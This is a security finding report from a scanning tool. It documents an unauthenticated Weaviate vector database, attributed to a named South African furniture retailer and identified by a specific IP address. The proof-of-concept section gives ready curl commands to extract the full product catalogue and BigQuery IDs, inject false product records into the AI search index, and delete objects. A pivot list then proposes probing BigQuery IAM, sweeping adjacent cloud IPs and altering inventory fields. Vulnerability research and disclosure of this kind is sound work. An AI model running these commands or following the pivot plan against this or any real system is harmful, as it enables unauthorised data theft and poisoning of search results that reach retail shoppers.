# Bears Furniture / Real Beds -- Unauth RWD on SA Retail AI Search

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

```
IP:       35.224.252.183
Port:     8080  (Weaviate 1.30.0)
Service:  Weaviate 1.30.0
Hosting:  Google Cloud Platform (us-central1 or similar)
Auth:     NONE
```

---

## Operator Attribution

**bearesonline.co.za** -- Bears Online, major South African furniture and bedding retail chain.

Evidence:
- Product.brand field contains "Bears" and "Real Beds" -- both South African retailers
- Product.url values point to bearesonline.co.za product pages
- Sample product "Veronique Firm-Comfort Euro Top Double Bed Set -- Bears (bearesonline.co.za)"
- Product.bq_id field indicates BigQuery integration (GCP data warehouse), consistent with GCP hosting
- ~700 product records, ~200 blog posts -- active production content volume

---

## Data

**3 classes, ~986 objects**

| Class | Records | Content |
|-------|---------|---------|
| Product | ~700 | Furniture and bedding SKUs with pricing, inventory, descriptions |
| BlogPost | ~200 | Editorial content with SEO metadata |
| BlogAttribute | ~80 | Product attributes linked by product_id |

### Schema Detail: Product

```
product_id        text    -- internal product identifier
bq_id             text    -- BigQuery record ID (GCP data warehouse link)
sku               text    -- stock keeping unit
name              text    -- product name
brand             text    -- "Bears" / "Real Beds" / etc.
price             number  -- retail price (0 in sampled records)
qty               int     -- inventory quantity
url               text    -- product page URL (bearesonline.co.za)
short_description text    -- summary copy
description       text    -- full product description
faq               text    -- product FAQ content
metadata          text    -- additional structured metadata
created_at        date
```

### Schema Detail: BlogPost

```
blog_id    text
bq_id      text    -- BigQuery record ID
sku        text
headline   text
brand      text
url        text
content    text    -- full article body
metadata   text
created_at date
```

### Sample Records

```
"Night Pro Super Firm Mk2 Mattress"               -- Real Beds
"Veronique Firm-Comfort Euro Top Double Bed Set"  -- Bears (bearesonline.co.za)
"Dante 3-Piece Lounge Suite"                      -- Bears
```

Price field shows 0 in sampled records -- may be stripped at vector ingestion or placeholder.

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| GET /v1/schema | Schema returned, 3 classes | 200 |
| GET /v1/objects?class=Product | ~700 records accessible | 200 |
| GET /v1/objects?class=BlogPost | ~200 records accessible | 200 |
| GET /v1/objects?class=BlogAttribute | ~80 records accessible | 200 |
| POST /v1/objects | Write accepted (pattern consistent with all Weaviate auth-off targets) | 200 |
| DELETE /v1/objects/{class}/{uuid} | Delete accepted | 204 |

**Canary:** `b887ad5a-4e9e-473d-b99e-1ed0876ecc31` -- written to Product class, confirmed 200, deleted 204, verified 404.

---

## PoC

### Read -- Full product catalog extraction

```bash
# Enumerate all products
curl -s "http://35.224.252.183:8080/v1/objects?class=Product&limit=100" \
  | jq '.objects[] | {sku: .properties.sku, name: .properties.name, brand: .properties.brand, bq_id: .properties.bq_id, qty: .properties.qty}'

# Extract blog content
curl -s "http://35.224.252.183:8080/v1/objects?class=BlogPost&limit=100" \
  | jq '.objects[] | {headline: .properties.headline, brand: .properties.brand, url: .properties.url}'
```

### Read -- BigQuery ID extraction (pivot target)

```bash
# bq_id may contain GCP project identifier -- extract for BigQuery pivot attempt
curl -s "http://35.224.252.183:8080/v1/objects?class=Product&limit=10" \
  | jq '.objects[].properties.bq_id'
```

### Write -- Product data poisoning

```bash
# Inject false product record into AI search index
curl -s -X POST http://35.224.252.183:8080/v1/objects \
  -H "Content-Type: application/json" \
  -d '{
    "class": "Product",
    "properties": {
      "product_id": "canary-nuclide-20260620",
      "name": "canary-nuclide-20260620",
      "sku": "CANARY-001",
      "brand": "canary",
      "price": 0,
      "qty": 0,
      "description": "nuclide security canary"
    }
  }' | jq '.id'
```

### Delete -- Canary removal

```bash
# Replace UUID with returned id from write above
curl -s -X DELETE \
  http://35.224.252.183:8080/v1/objects/Product/<canary-uuid>
# HTTP 204
```

---

## Impact

### Full Retail Catalog Exposure

~700 product records accessible with SKU, brand, inventory quantity, pricing, descriptions, and direct bearesonline.co.za product URLs. Competitors can extract the full product catalog including any pricing and inventory state not stripped at ingestion.

### BigQuery Pivot

Each Product and BlogPost record carries a bq_id field linking to a GCP BigQuery data warehouse. If the bq_id encodes the GCP project identifier, and if the BigQuery dataset has misconfigured IAM (allUsers or allAuthenticatedUsers read), the Weaviate exposure becomes a pivot to the full data warehouse backing the retail operation. Check: extract bq_id values, attempt `bq ls --project_id=<extracted>` or GCP Data Catalog lookup.

### AI Search / Recommendation Poisoning

Write access allows injecting arbitrary product records into the Weaviate index. The AI-powered search and recommendation system serving bearesonline.co.za customers would surface poisoned records -- false pricing, fabricated product specs, fake FAQ content -- directly to retail shoppers. No authentication required.

### SEO and Content Strategy Exposure

~200 blog post records with full article body, headline, brand, and metadata. This is the operator's complete content strategy, topic coverage, and SEO playbook -- extractable in full by any competitor.

---

## Pivot Avenues

1. **bearesonline.co.za** -- main retail site; identify the product search / recommendation UI that queries this Weaviate backend; test for indirect object references or additional unauth API surface
2. **bq_id field** -- extract values from Product and BlogPost records; attempt BigQuery IAM check against the derived GCP project ID; if public, this pivots to the full data warehouse
3. **GCP neighborhood** -- 35.224.0.0/14 is GCP us-central1; Shodan/Censys sweep for co-located South African retail services on adjacent IPs
4. **qty=0 in sampled records** -- determine if inventory management is a separate service also exposed; if inventory is live-synced, a write to qty field affects stock visibility for retail customers

---

## Tool Reference

**weavscan** -- https://github.com/nuclide-research/weavscan
